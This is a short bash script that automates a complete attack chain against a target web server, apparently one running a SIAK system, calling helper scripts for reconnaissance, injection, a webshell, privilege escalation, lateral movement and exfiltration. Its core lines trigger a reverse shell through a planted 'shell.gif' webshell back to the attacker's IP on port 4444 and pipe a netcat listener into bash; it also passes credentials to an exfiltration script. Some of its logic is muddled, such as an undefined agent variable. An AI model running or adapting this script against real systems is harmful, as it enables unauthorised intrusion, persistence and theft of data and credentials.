#!/bin/bash
# FULL SIAK KILLCHAIN AUTOMATION
TARGET=$1
C2_IP=$(curl -s ifconfig.me)

# 1. Recon → 2. Vulnscan → 3. Shell → 4. Creds → 5. Privesc → 6. Lateral → 7. Exfil
./recon.sh $TARGET &
./inject.py http://$TARGET &
python3 shell.py http://$TARGET &

sleep 60
# Deploy reverse shell via found webshell
curl -d "ip=$C2_IP&port=4444&proto=python" http://$TARGET/shell.gif

# Auto-deploy persistence
echo "$C2_AGENT" | nc -lvp 4444 | bash
./priv_esc.sh
./lateral.py
./exfil.sh $TARGET siak_user siak_pass